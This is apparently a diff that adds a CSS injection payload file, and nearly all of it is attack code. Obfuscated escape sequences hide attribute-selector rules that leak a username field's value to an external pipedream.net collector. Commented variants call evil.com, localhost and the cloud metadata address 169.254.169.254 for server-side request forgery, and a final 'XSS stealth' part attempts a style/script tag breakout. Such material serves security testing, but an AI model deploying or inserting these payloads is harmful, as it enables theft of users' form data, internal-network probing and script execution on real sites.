@@ -1,0 +1,36 @@
+inpu\74 /* t */[name\3d "username"][value^="\000061"]{
+  background-i\6d age:/*trick*/url("https://eoow6y96ffo9mzx.m.pipedream.net/l\65ak?u=\000061");
+}
+
+inpu\74[name\3d "username"][value^="\000062"]{
+  background-i\6d age:url("https://eoow6y96ffo9mzx.m.pipedream.net/l\65ak?u=\000062");
+}
+
+bo\64 y {
+  background-i\6d age:url("https://eoow6y96ffo9mzx.m.pipedream.net\002fsecret");
+}
+#t\65 st-ssrf {
+  background:url("https://eoow6y96ffo9mzx.m.pipedream.net/");
+}
+
+/*  
+inpu\74 [name\3d "username"][value^="\000061"]{
+  background-i\6d age:url("https://evil.com/l\65 ak?u=\000061");
+}
+
+inpu\74[name\3d "username"][value^="\000062"]{
+  background-i\6d age:url("https://evil.com/l\65 ak?u=\000062");
+}
+
+bo\64 y {
+  background-i\6d age:url("http://127.0.0.1:80\002f secret");
+}
+#t\65 st-ssrf {
+  background:url("http://169.254.169.254/latest/meta-data/");
+}
+*/
+
+/* ======== [PAYLOAD PART 3: XSS STEALTH] ======== */
+\00003c/style\00003e\00003c/script\00003e
+alert\000028'XSS via CSS stealth'\000029
+\00003c/script\00003e\00003c/style\00003e
